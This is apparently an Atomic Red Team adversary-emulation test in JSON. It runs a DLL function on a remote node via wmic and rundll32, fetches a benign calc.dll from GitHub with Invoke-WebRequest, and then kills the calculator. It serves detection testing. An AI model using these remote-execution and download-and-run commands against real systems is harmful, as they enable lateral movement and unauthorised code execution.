{
  "id": "00738d2a-4651-4d76-adf2-c43a41dfb243",
  "name": "WMI Execute rundll32",
  "description": "This test uses wmic.exe to execute a DLL function using rundll32. Specify a valid value for remote IP using the node parameter.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "4d4bff71-689b-4ef8-9da3-047f9b93b313",
      "type": "execute-command",
      "data": {
        "command": "wmic /node:#{node} process call create \"rundll32.exe \\\"#{dll_to_execute}\\\" #{function_to_execute}\"\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "691f916b-499d-4c0b-a37a-ea07dfc36cb8",
      "type": "execute-command",
      "data": {
        "command": "taskkill /f /im calculator.exe",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "f8d34814-8eac-46e4-9cea-9b51c4f7b7d5",
      "name": "Check dependency 1/1",
      "description": "DLL with function to execute must exist on disk at specified location (#{dll_to_execute})",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{dll_to_execute}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "b67f7ed1-6938-4914-8685-b52276d848c9",
      "name": "Resolve dependency 1/1",
      "description": "DLL with function to execute must exist on disk at specified location (#{dll_to_execute})",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/bin/calc.dll?raw=true\" -OutFile \"#{dll_to_execute}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "45cea0a5-bd18-4c7e-8698-178a729fdafc",
      "name": "Re-check dependency 1/1",
      "description": "DLL with function to execute must exist on disk at specified location (#{dll_to_execute})",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{dll_to_execute}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "4d4bff71-689b-4ef8-9da3-047f9b93b313",
      "p": "on-success",
      "o": "691f916b-499d-4c0b-a37a-ea07dfc36cb8"
    },
    {
      "s": "4d4bff71-689b-4ef8-9da3-047f9b93b313",
      "p": "on-failure",
      "o": "691f916b-499d-4c0b-a37a-ea07dfc36cb8"
    },
    {
      "s": "f8d34814-8eac-46e4-9cea-9b51c4f7b7d5",
      "p": "on-success",
      "o": "4d4bff71-689b-4ef8-9da3-047f9b93b313"
    },
    {
      "s": "f8d34814-8eac-46e4-9cea-9b51c4f7b7d5",
      "p": "on-failure",
      "o": "b67f7ed1-6938-4914-8685-b52276d848c9"
    },
    {
      "s": "b67f7ed1-6938-4914-8685-b52276d848c9",
      "p": "on-success",
      "o": "45cea0a5-bd18-4c7e-8698-178a729fdafc"
    },
    {
      "s": "45cea0a5-bd18-4c7e-8698-178a729fdafc",
      "p": "on-failure",
      "o": "4d4bff71-689b-4ef8-9da3-047f9b93b313"
    }
  ],
  "tags": [
    "T1047",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "node",
      "type": "string",
      "description": "Ip Address",
      "value": "127.0.0.1"
    },
    {
      "name": "dll_to_execute",
      "type": "string",
      "description": "Path to DLL.",
      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\calc.dll"
    },
    {
      "name": "function_to_execute",
      "type": "string",
      "description": "Name of DLL function to call",
      "value": "StartW"
    }
  ]
}